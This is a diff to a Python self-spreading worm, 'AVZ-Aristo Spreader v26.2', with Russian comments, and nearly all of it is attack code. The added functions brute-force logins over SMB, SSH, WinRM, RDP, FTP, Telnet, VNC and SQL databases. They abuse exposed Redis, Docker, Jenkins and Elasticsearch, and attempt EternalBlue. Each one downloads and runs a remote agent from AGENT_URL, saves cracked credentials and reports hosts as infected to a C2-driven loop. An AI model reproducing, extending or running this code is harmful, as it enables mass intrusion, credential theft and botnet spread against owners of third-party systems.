@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.2 – ускоренный, потоковый вывод, UTC+5
+# AVZ-Aristo Spreader v26.2 – ускоренный, UTC+5, потоковый вывод
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
 from datetime import datetime, timezone, timedelta
 
@@ -63,6 +63,9 @@ random.shuffle(GUARANTEED_IPS)
 
 TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
 
+def now_str():
+    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
+
 def random_ip():
     if random.random() < 0.8:
         return random.choice(GUARANTEED_IPS)
@@ -93,8 +96,13 @@ def get_country(ip):
         pass
     return ""
 
-def now_str():
-    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
+def get_local_ips():
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        return []
+    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+    return [str(host) for host in network.hosts() if str(host) != local_ip]
 
 async def probe_port(ip, port):
     if is_port_cached(ip, port):
@@ -107,20 +115,360 @@ async def probe_port(ip, port):
     except:
         return False
 
-# Все векторы (smb_brute, winrm_brute, ssh_brute_ultra, rdp_brute, ftp_brute, exploit_redis, exploit_docker, exploit_jenkins, exploit_telnet, exploit_elasticsearch, mysql_brute, mssql_brute, postgresql_brute, vnc_brute, eternalblue_check, eternalblue_exploit, mongodb_brute, couchdb_brute, cassandra_brute) – без изменений, только в каждом добавлено логирование времени через now_str()
+# ===== Векторы =====
+async def smb_brute(ip):
+    if sys.platform != 'linux':
+        return False
+    for u, p in CREDS + SUCCESS_CREDS:
+        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
+        try:
+            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+            await asyncio.wait_for(proc.communicate(), timeout=5)
+            if proc.returncode == 0:
+                save_success_creds(u, p)
+                return True
+        except:
+            pass
+    return False
+
+async def winrm_brute(ip):
+    try:
+        import winrm
+        for u, p in CREDS + SUCCESS_CREDS:
+            try:
+                session = winrm.Session(ip, auth=(u, p), transport='ntlm')
+                result = session.run_ps(f"Invoke-WebRequest -Uri {AGENT_URL} -OutFile C:\\Windows\\Temp\\agent.ps1; C:\\Windows\\Temp\\agent.ps1")
+                if result.status_code == 0:
+                    save_success_creds(u, p)
+                    return True
+            except:
+                continue
+    except ImportError:
+        pass
+    return False
+
+async def ssh_brute_ultra(ip):
+    try:
+        import asyncssh
+        for u, p in (SUCCESS_CREDS + CREDS[:5]):
+            try:
+                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
+                    await conn.run(f"wget -O- {AGENT_URL} | bash")
+                    save_success_creds(u, p)
+                    return True
+            except:
+                continue
+    except ImportError:
+        pass
+    return False
+
+async def rdp_brute(ip):
+    if sys.platform != 'linux':
+        return False
+    for u, p in (SUCCESS_CREDS + CREDS[:5]):
+        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
+        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+        try:
+            await asyncio.wait_for(proc.communicate(), timeout=3)
+            if proc.returncode == 0:
+                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
+                save_success_creds(u, p)
+                return True
+        except:
+            pass
+    return False
+
+async def ftp_brute(ip):
+    for u, p in (SUCCESS_CREDS + CREDS[:5]):
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
+            ftp.login(u, p)
+            with open("/tmp/agent.sh", "w") as f:
+                f.write(f"wget -O- {AGENT_URL} | bash")
+            with open("/tmp/agent.sh", "rb") as f:
+                ftp.storbinary("STOR agent.sh", f)
+            ftp.quit()
+            save_success_creds(u, p)
+            return True
+        except:
+            pass
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
+        ftp.login()
+        ftp.quit()
+        return True
+    except:
+        pass
+    return False
+
+async def exploit_redis(ip):
+    try:
+        import redis
+        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
+        r.ping()
+        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
+        r.config_set('dir', '/root/.ssh')
+        r.config_set('dbfilename', 'authorized_keys')
+        r.save(); r.close()
+        return True
+    except:
+        return False
+
+async def exploit_docker(ip):
+    try:
+        import docker
+        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
+        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
+        client.close()
+        return True
+    except:
+        return False
+
+async def exploit_jenkins(ip):
+    url = f'http://{ip}:8080/script'
+    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(url, data={'script': script}, timeout=3) as resp:
+                return resp.status == 200
+    except:
+        pass
+    return False
+
+async def exploit_telnet(ip):
+    for u, p in (SUCCESS_CREDS + CREDS[:5]):
+        try:
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.5)
+            writer.write(u.encode() + b"\r\n")
+            await writer.drain()
+            await asyncio.sleep(0.2)
+            writer.write(p.encode() + b"\r\n")
+            await writer.drain()
+            await asyncio.sleep(0.2)
+            writer.write(f"wget -O- {AGENT_URL} | sh\r\n".encode())
+            await writer.drain()
+            await asyncio.sleep(0.3)
+            writer.write(b"exit\r\n")
+            await writer.drain()
+            writer.close()
+            save_success_creds(u, p)
+            return True
+        except:
+            pass
+    return False
+
+async def exploit_elasticsearch(ip):
+    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
+                return resp.status == 200
+    except:
+        pass
+    return False
+
+async def mysql_brute(ip):
+    try:
+        import mysql.connector
+        for u, p in (SUCCESS_CREDS + CREDS):
+            try:
+                conn = mysql.connector.connect(host=ip, user=u, password=p, connect_timeout=3)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT sys_exec('wget -O- {AGENT_URL} | bash')")
+                conn.close()
+                save_success_creds(u, p)
+                return True
+            except:
+                pass
+    except ImportError:
+        pass
+    return False
+
+async def mssql_brute(ip):
+    try:
+        import pymssql
+        for u, p in (SUCCESS_CREDS + CREDS):
+            try:
+                conn = pymssql.connect(server=ip, user=u, password=p, login_timeout=3)
+                cursor = conn.cursor()
+                cursor.execute(f"EXEC xp_cmdshell 'curl -s {AGENT_URL} | cmd'")
+                conn.close()
+                save_success_creds(u, p)
+                return True
+            except:
+                pass
+    except ImportError:
+        pass
+    return False
+
+async def postgresql_brute(ip):
+    try:
+        import psycopg2
+        for u, p in (SUCCESS_CREDS + CREDS):
+            try:
+                conn = psycopg2.connect(host=ip, user=u, password=p, connect_timeout=3)
+                cur = conn.cursor()
+                cur.execute(f"COPY (SELECT 1) TO PROGRAM 'wget -O- {AGENT_URL} | bash'")
+                conn.close()
+                save_success_creds(u, p)
+                return True
+            except:
+                pass
+    except ImportError:
+        pass
+    return False
+
+async def vnc_brute(ip):
+    try:
+        from vncdotool import api
+        for pw in ['', 'password', 'admin', '123456', 'root']:
+            try:
+                client = api.connect(ip, password=pw)
+                client.keyPress('win-r')
+                time.sleep(0.2)
+                client.typeText(f'cmd.exe /c curl -s {AGENT_URL} | cmd')
+                client.keyPress('enter')
+                client.disconnect()
+                return True
+            except:
+                continue
+    except ImportError:
+        pass
+    return False
+
+async def eternalblue_check(ip):
+    try:
+        proc = await asyncio.create_subprocess_shell(f"nmap -p 445 --script smb-vuln-ms17-010 {ip}", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
+        stdout, _ = await proc.communicate()
+        if b"VULNERABLE" in stdout:
+            return True
+    except:
+        pass
+    return False
+
+async def eternalblue_exploit(ip):
+    for u, p in CREDS[:3]:
+        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
+        try:
+            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+            await asyncio.wait_for(proc.communicate(), timeout=5)
+            if proc.returncode == 0:
+                return True
+        except:
+            pass
+    return False
+
+async def mongodb_brute(ip):
+    try:
+        import pymongo
+        client = pymongo.MongoClient(ip, 27017, serverSelectionTimeoutMS=2000)
+        client.server_info()
+        client.close()
+        return True
+    except:
+        pass
+    return False
+
+async def couchdb_brute(ip):
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f'http://{ip}:5984/_all_dbs', timeout=2) as resp:
+                if resp.status == 200:
+                    return True
+    except:
+        pass
+    return False
+
+async def cassandra_brute(ip):
+    try:
+        from cassandra.cluster import Cluster
+        cluster = Cluster([ip], port=9042, connect_timeout=3)
+        session = cluster.connect()
+        session.shutdown()
+        return True
+    except:
+        pass
+    return False
+
+def save_success_creds(username, password):
+    pair = [username, password]
+    if pair not in SUCCESS_CREDS:
+        SUCCESS_CREDS.append(pair)
+        with open(SUCCESS_CREDS_FILE, "w") as f:
+            json.dump(SUCCESS_CREDS, f)
 
 async def infect(ip, port_stats):
     ports = PORT_LIST
     open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
-    any_open = False
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-            any_open = True
-    if not any_open:
-        return False
-    # Попытки векторов...
-    # ... (полный код infect из v26.0 с добавлением now_str() в сообщения [INFECTED])
+    # SMB
+    if open_ports[9] and await smb_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via SMB", flush=True)
+        return True
+    # SSH
+    if open_ports[1] and await ssh_brute_ultra(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
+        return True
+    # WinRM
+    if open_ports[13] and await winrm_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via WinRM", flush=True)
+        return True
+    # MSSQL
+    if open_ports[5] and await mssql_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via MSSQL", flush=True)
+        return True
+    # MySQL
+    if open_ports[7] and await mysql_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via MySQL", flush=True)
+        return True
+    # PostgreSQL
+    if open_ports[10] and await postgresql_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via PostgreSQL", flush=True)
+        return True
+    # RDP
+    if open_ports[8] and await rdp_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via RDP", flush=True)
+        return True
+    # VNC
+    if open_ports[11] and await vnc_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via VNC", flush=True)
+        return True
+    # Redis
+    if open_ports[14] and await exploit_redis(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via Redis", flush=True)
+        return True
+    # Jenkins
+    if open_ports[15] and await exploit_jenkins(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via Jenkins", flush=True)
+        return True
+    # Elasticsearch
+    if open_ports[17] and await exploit_elasticsearch(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via Elasticsearch", flush=True)
+        return True
+    # FTP
+    if open_ports[0] and await ftp_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via FTP", flush=True)
+        return True
+    # EternalBlue
+    if open_ports[9] and await eternalblue_check(ip) and await eternalblue_exploit(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via EternalBlue", flush=True)
+        return True
+    # MongoDB
+    if open_ports[6] and await mongodb_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via MongoDB", flush=True)
+        return True
+    # CouchDB
+    if open_ports[12] and await couchdb_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via CouchDB", flush=True)
+        return True
+    # Cassandra
+    if open_ports[16] and await cassandra_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via Cassandra", flush=True)
+        return True
     return False
 
 async def worker(queue, stats, port_stats, progress_cb=None):
@@ -171,14 +519,6 @@ async def local_scan(progress_callback=None):
         return {'success':0, 'fail':0}, {}
     print(f"[{now_str()}] [*] Scanning local network, {len(ips)} hosts", flush=True)
     return await scan_cycle(ips, progress_callback)
-
-def get_local_ips():
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-    except:
-        return []
-    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
-    return [str(host) for host in network.hosts() if str(host) != local_ip]
 
 async def main_async(args):
     print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
